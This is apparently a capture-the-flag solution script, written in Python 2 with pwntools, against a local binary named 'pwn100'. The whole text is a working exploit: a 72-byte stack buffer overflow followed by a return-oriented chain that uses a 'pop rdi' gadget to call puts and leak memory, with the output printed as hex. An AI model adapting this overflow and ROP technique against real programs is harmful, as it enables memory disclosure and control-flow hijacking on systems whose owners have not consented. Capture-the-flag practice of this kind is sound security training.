from pwn import *
 
io = process("./pwn100")
elf = ELF("./pwn100")
 
 
puts_addr = elf.plt['puts']
pop_rdi = 0x400763
 
payload = "A" *72
payload += p64(pop_rdi)
payload += p64(puts_addr)
payload += p64(puts_addr)
payload = payload.ljust(200, "B")
io.send(payload)
io.recvuntil("bye~")
print io.recv().encode('hex')